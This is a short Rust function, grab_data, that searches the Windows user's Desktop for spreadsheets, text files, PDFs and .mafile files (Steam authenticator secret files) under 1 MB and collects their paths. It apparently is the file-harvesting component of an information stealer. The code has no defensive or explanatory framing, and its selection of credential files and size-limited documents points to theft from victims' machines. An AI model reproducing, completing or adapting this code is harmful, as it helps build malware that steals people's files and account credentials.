pub fn grab_data() -> Vec<String> {
    let mut paths: Vec<String> = Vec::new();
    let glob_string = format!(
        r"{}/Desktop/*.{{xls,txt,pdf,mafile}}",
        &std::env::var("USERPROFILE").unwrap()
    );
    globwalk::glob_builder(&glob_string)
        .max_depth(1)
        .build()
        .ok()
        .unwrap()
        .filter_map(|f| f.ok())
        .enumerate()
        .for_each(|(_idx, path_)| {
            let path = path_.path();
            if path.is_file() {
                if path.metadata().unwrap().len() <= 1_000_000 {
                    paths.push(path.to_string_lossy().to_string());
                }
            }
    });
    paths 
}